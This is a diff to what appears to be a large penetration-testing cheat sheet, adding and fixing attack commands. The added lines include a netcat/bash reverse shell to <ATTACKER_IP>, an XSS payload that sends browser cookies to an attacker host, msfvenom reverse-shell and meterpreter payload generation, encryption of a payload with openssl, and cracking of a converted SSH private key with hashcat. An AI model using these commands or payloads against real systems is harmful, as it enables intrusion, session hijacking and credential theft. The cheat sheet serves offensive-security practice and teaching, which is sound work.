@@ -53,6 +53,7 @@ Thank you for reading.
         - [FTP](#ftp)
         - [Kerberos](#kerberos)
         - [Linux](#linux)
+        - [Linpeas](#linpeas)
         - [Microsoft Windows](#microsoft-windows)
         - [PHP Webserver](#php-webserver)
         - [Ping](#ping)
@@ -300,6 +301,7 @@ Thank you for reading.
 | Krbrelayx | https://github.com/dirkjanm/krbrelayx |
 | LAPSDumper | https://github.com/n00py/LAPSDumper |
 | LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
+| LinPEAS | https://github.com/carlospolop/linpeas |
 | LinEnum | https://github.com/rebootuser/LinEnum |
 | lsassy | https://github.com/Hackndo/lsassy |
 | Moriaty | https://github.com/BC-SECURITY/Moriarty |
@@ -542,8 +544,9 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ##### Netcat
 
 ```c
-nc -lnvp <LPORT> > <FILE>
-nc <RHOST> <RPORT> < <FILE>
+nc -lnvp <LPORT> > <FILE>                                                                   // Listener 
+nc <RHOST> <RPORT> < <FILE>                                                                 // Sender
+mkfifo /tmp/backpipe;cat /tmp/backpipe|bash -i 2>&1|nc <ATTACKER_IP> 1337 > /tmp/backpipe      // Reverse Shell    
 ```
 
 ##### Impacket
@@ -741,6 +744,12 @@ sudo ip r add 172.16.1.0/24 dev ligolo
 ```
 
 #### Linux
+
+#### Linpeas
+
+```c
+/usr/share/peass/linpeas.sh
+```
 
 ##### CentOS
 
@@ -1597,8 +1606,7 @@ export HTTPS_PROXY=https://localhost:8080
 
 ```c
  feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -t 100
- feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -r –filter-status 403                // For direcotry findings --filter-status 403 exclude 
- any 403 HTTP status code from output.
+ feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -r –filter-status 403                // For direcotry findings --filter-status 403 exclude any 403 HTTP status code from output.
 ```
 
 
@@ -1624,6 +1632,7 @@ dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
 <script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
 <script>user.changeEmail('user@domain');</script>
 <iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
+<script>new Image().src="http://<ATTACKER_IP>/collect?c="+encodeURIComponent(document.cookie)</script>        // Out-of-band (OOB) data exfiltration
 <img src='http://<RHOST>'/>
 ```
 
@@ -1720,7 +1729,7 @@ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 40
 ##### Searching for LFI
 
 ```c
-ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../index.php?page=FUZZ -fs 15349
 ```
 
 ##### Fuzzing with PHP Session ID
@@ -3166,6 +3175,13 @@ hashcat -m  <MODULE> --username --show <HASH_FIle>
 /usr/share/hashcat/rules/best64.rule
 ```
 
+```c
+openssl pkcs8 -in id_rsa -outform DER -out key.der -nocrypt                 // Convert OpenSSH to DER PKCS8 Format Key
+hashcat -m 16200 key.der /PATH/TO/WORDLIST/<WORDLIST> --force
+
+```
+
+
 ##### Custom Rules
 
 > https://hashcat.net/wiki/doku.php?id=rule_based_attack
@@ -4019,6 +4035,23 @@ proxychains -q msfconsole
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
 ```
 
+##### Generate Encrypted Payload
+
+```c
+# Generate the Payload:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f raw -o payload.bin
+
+Encrypt the Payload:
+openssl aes-256-cbc -e -in payload.bin -out payload_encrypted.bin -k "YourSecretKey" -pbkdf2
+
+Listen
+nc -lvnp 1337
+
+Send the Encrypted Payload:
+nc <ATTACKER_IP> 1337 < payload_encrypted.bin
+```
+
+
 ###### Setup Listener for Microsoft Windows
 
 ```c
@@ -4611,10 +4644,10 @@ ALTER USER neo4j SET PASSWORD '<PASSWORD>'
 > Use `bloodhound-python` to enumerate Active Directory objects and relationships for analysis in BloodHound. Supports password, hash, or Kerberos ticket-based auth.
 
 ```bash
-bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip
-bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip                         // -d UPPERCASE
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<DC_RHOST>' -ns <RHOST> -c all --zip
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
-bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<DC_RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
 KRB5CCNAME=user.name.ccache faketime 'now + 8 hours' bloodhound-python -k -u user.name -d FQDN -c All -ns <IP> --disable-autogc // 🎟️ Kerberos Ticket Authentication (TGT in ccache)
 faketime 'now + 8 hours' bloodhound-python -k -u user.name -d FQDN -c All -ns <IP> --disable-autogc
 faketime 'now + 7 hours' bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DOMAIN> -c all --disable-autogc
@@ -4792,7 +4825,7 @@ impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -imp
 
 ```c
 impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
-impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <IP> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-getUserSPNs
@@ -5915,6 +5948,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 
 ```c
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o payload.exe
 ```
 
 ```c
